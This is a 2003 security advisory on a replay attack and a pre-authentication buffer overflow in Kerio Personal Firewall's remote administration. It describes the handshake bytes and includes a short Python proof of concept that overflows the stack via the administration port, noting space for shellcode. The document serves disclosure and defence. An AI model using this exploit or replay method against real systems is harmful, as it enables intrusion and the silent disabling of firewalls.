Title: Kerio Personal Firewall Replay Attack and Buffer Overflow

Class: Design Error; Boundary Error Condition (Buffer Overflow)

Remotely Exploitable: Yes

Locally Exploitable: Yes

Vendors contacted:
  - Kerio
  We sent notifications mails to the following addresses:
  security@...io.com, support@...io.com, webmaster@...io.com,
  kpf_bugs@...io.com several times during March and April
  (2003-03-11, 2003-03-24, 2003-04-10, 2003-04-24) and never
  received an answer from Kerio.

Release Mode: USER RELEASE


*Vulnerability Description:*

  Kerio Personal Firewall (KPF) is a firewall for workstations designed
  to protect them against attacks from the Internet and the local
  network. We found two security vulnerabilities in KPF's remote
  administration system:

  [BID 7179]
  A replay attack is possible against the authenticated/encrypted
  channel for remote administration. A design problem in the
  authentication mechanism for remote administration allows an attacker
  to replay captured packets from a valid remote administration session
  in order to reproduce the administrator's directives to the personal
  firewall.
  For example if the attacker is able to sniff a valid session in which
  the administrator disabled the firewall capabilities, then the
  attacker will gain the ability to disable the personal firewall at
  will at any time in the future.

  [BID 7180]
  A remotely exploitable buffer overflow exists in the administrator
  authentication process.


*Vulnerable Packages:*

  Kerio Personal Firewall version 2.1.4 and previous versions.


*Solution/Vendor Information/Workaround:*

  Contact the vendor for a fix.
  Workaround: disable the remote administration feature.


*Credits:*

  These vulnerabilities were found by Emiliano Kargieman, Hern√°n Gips
  and Javier Burroni from Core Security Technologies during
  Bugweek 2003 (March 3-7, 2003).


*Technical Description - Exploit/Concept Code:*

  We found two security vulnerabilities in Kerio PF's remote
  administration system.

  [BID 7179]
  A replay attack is possible against the authenticated/encrypted
  remote administration channel. As a result of a design problem in the
  authentication mechanism for remote administration, it is possible
  to replay a previously captured administration session.

  If 'S' is the workstation running Kerio personal firewall and 'C' is
  the administrator workstation, the following scheme shows the initial
  key exchange and authentication packets for a remote administration
  session:

   S           C
         <--- connect
         ---> 10 bytes (0f 00 0a 00 01 00 00 00 02 00)
  [*]    ---> 128 bytes (the initial 64 bytes are 0 and the last
                         64 bytes are the 'public' key)
         ---> 128 bytes (Everything is 0ed except the last 4 bytes
                         [01 00 01 00])
  [0]    <--- 4 bytes (00 00 00 40)
  [1]    <--- 64 bytes (This 64 bytes change from session to session)
  [2]    <--- 32 bytes (From now on, everything is encrypted and differs
                        from session to session)
         ---> 4 bytes ()
  [3]    <--- 64 bytes (user authentication)
         ........
         ........  (The session continues with commands and responses)
         ........

  [*] The last 64 bytes of this packet are read from the file
  'persfw.key' on the Kerio installation directory.

  It was noted from analyzing these sessions that the first differences
  between different sessions come from the administrator's workstation
  'C'. This led us to try replaying an administration session as a
  whole, with the unexpected result that it was deemed valid by 'S'.
  This shows that in fact no randomization or serialization is used on
  the 'server' side 'S', and thus there is no way for Kerio to ensure
  that the session is new and not a replay of an old one.

  As a result, an attacker with access to an encrypted administration
  session can record the session and replay it to the server at a later
  time to reissue the administration commands to the personal firewall.
  The commands replayed can include enabling/disabling the firewall,
  adding firewall rules, etc.


  [BID 7180]
  A remotely exploitable buffer overflow exists in the administrator
  authentication process. When Administrator connects to the firewall a
  handshake occurs in order to establish an encrypted session. The 4th
  packet of the handshake (the first packet sent by the administrator)
  is a 4 byte packet data, with a fixed number of 0x40 (64) indicating
  the size of the following packet expected to contain the
  administrator's key.
  No boundary checks exist at the firewall side for processing this
  data, and the recv() reads the 4 bytes and then attempts to read the
  amount of data indicated by the 4 bytes to a buffer on the stack.
  As a result an attacker connecting to the administration port on the
  personal firewall can construct a packet sequence that will overflow
  the buffer on the stack, allowing her to execute arbitrary code on
  the machine running the personal firewall.

  It is important to note that these packets are accepted by the
  personal firewall before authentication of the administrator takes
  place.

  The following proof of concept Python script will make the program
  jump to address 0x41414141. Note that there is enough space in the
  buffer (approx. 1800 bytes) to insert a shell code.

         fd.connect(('192.168.66.160', 44334))
         fd.recv(10)
         fd.recv(256)
         fd.send(struct.pack('!L', 0x149c))
         astr = 'A'*0x149c
         fd.send(astr)

     except Exception, e:
         print e
         pass
